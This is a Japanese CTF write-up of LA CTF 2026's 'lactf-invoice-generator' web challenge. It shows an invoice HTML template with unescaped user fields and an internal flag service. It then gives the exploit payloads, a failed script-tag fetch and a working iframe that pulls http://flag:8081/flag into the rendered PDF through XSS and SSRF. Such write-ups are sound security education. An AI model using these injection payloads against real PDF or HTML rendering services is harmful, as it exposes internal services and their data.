---
title: 'lactf-invoice-generator'
description: 'LA CTF 2026のWriteupです。'
pubDate: 2026-02-19T22:24:00+09:00
category: 'CTF'
tags: ['LA CTF', 'Writeup', 'Web', 'XSS', 'SSRF']
---

# lactf-invoice-generator - LA CTF

## コードレビュー
コードをみているとflagコンテナとinvoiceコンテナが動いていることがわかった  
invoiceの処理でhtmlを使ってPDFを作成していることがわかる  
そのhtmlの中身がXSSが発火する箇所があった  
XSSとSSRFが有効な攻撃だと判断した
```html
<div class="customer-info">
    <strong>Bill To:</strong>
        ${name}
</div>
<table>
    <thead>
        <tr>
            <th>Description</th>
            <th class="text-right">Unit Price</th>
            <th class="text-right">Quantity</th>
            <th class="text-right">Amount</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>${item}</td>
            <td class="text-right">$${cost.toFixed(2)}</td>
            <td class="text-right">1</td>
            <td class="text-right">$${cost.toFixed(2)}</td>
        </tr>
    </tbody>
</table>
```

flagコンテナ
```js
const http = require("http");

const FLAG = process.env.FLAG || "lactf{fake_flag}";
const PORT = 8081;

const server = http.createServer((req, res) => {
  if (req.method === "GET" && req.url === "/flag") {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(`<div><strong>FLAG:</strong> ${FLAG}</div>`);
    return;
  }
  res.writeHead(404, { "Content-Type": "text/plain" });
  res.end("Not found");
});

server.listen(PORT, () => {
  console.log(`Flag service running on port ${PORT}`);
});
```

## Exploit
`<script>`で実行したが失敗したので`<iframe>`を使った

*Failure*
```html
<script>
fetch('http://flag:8081/flag')
  .then(r => r.text())
  .then(t => document.body.insertAdjacentHTML('beforeend', t));
</script>
```
*Success*
```html
<iframe src="http://flag:8081/flag" style="width:100%;height:200px;border:0"></iframe>
```
